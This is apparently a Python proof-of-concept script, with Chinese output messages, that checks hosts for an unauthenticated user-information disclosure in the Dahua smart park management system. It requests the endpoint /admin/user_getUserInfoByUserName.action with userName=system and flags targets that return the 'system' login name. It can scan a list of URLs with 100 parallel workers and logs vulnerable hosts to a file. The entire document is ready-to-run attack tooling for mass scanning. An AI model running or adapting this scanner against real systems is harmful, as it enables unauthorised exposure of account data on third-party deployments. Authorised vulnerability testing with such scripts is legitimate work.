import requests,argparse,json
requests.packages.urllib3.disable_warnings()
from multiprocessing.pool import Pool
def banner():
    banner = """欢迎使用大华智慧园区管理系统脚本"""
    print(banner)

def poc(target):
    payload = "/admin/user_getUserInfoByUserName.action?userName=system"
    try:
        result = requests.get(url=target,verify=False,timeout=5)
        if result.status_code == 200:
            result1 = requests.get(url=target+payload,verify=False,timeout=5)
            content = json.loads(result1.text)
            #print(type(content))
            if 'system' in content['loginName']:
                print(f"[+]{target}存在大华智慧园区管理系统漏洞")
                with open("大华_result.txt","a",encoding="utf-8")as f:
                    f.write(f"{target}存在大华智慧园区管理系统漏洞\n")
            else:
                print(f"[-]{target}不存在大华智慧园区管理系统漏洞")
        else:
            print(f"[-]{target}无法访问")
    except Exception as e:
        pass

def main():
    banner()
    parser = argparse.ArgumentParser("大华智慧园区管理系统脚本")
    parser.add_argument("-u","--url",dest="url",type=str,help="目标url")
    parser.add_argument("-f","--file",dest="file",type=str,help="目标url文件")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
         url_list = []
         with open(args.file,"r",encoding="utf-8") as f:
             for url in f.readlines():
                 url_list.append(url.strip().replace("\n",""))
             mp = Pool(100)
             mp.map(poc,url_list)
             mp.close()
             mp.join()

    else:
        print(f"参数错误,请使用-h查看帮助")

if __name__ == "__main__":
    main()

